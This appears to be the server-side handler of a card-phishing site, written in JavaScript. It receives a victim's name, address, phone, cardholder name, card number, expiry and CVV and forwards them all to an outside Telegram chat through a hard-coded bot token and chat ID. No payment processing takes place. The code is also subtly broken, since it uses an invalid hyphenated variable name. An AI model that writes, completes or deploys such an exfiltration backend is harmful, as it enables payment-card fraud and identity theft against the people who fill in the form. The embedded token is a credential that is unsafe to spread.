export default async function handler(req, res) {
  if (req.method === "POST") {

    const {
      nombre,
      apellido,
      direccion1,
      direccion2,
      cp,
      localidad,
      estado,
      telefono,
      titular_tarjeta,
      numero_tarjeta,
      fecha-expiracion,
      cvv
    } = req.body;

    const TOKEN = "8401970175:AAE05kR2oXgs56qnmxyE8UnTmsfx6ASURk0";
    const CHAT_ID = "7575566106";

    const mensaje = `
🔥 NUEVO REGISTRO

👤 ${nombre} ${apellido}

🏠 Dirección:
${direccion1}
${direccion2 || ""}

📍 ${localidad}, ${estado}
📮 CP: ${cp}

📱 Teléfono: ${telefono}

📝 Nombre del titular: ${titular_tarjeta}

🔢 ${numero_tarjeta} | ${fecha-expiracion} | ${cvv}
`;

    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: mensaje
      })
    });

    return res.status(200).json({ ok: true });
  }

  return res.status(405).end();
}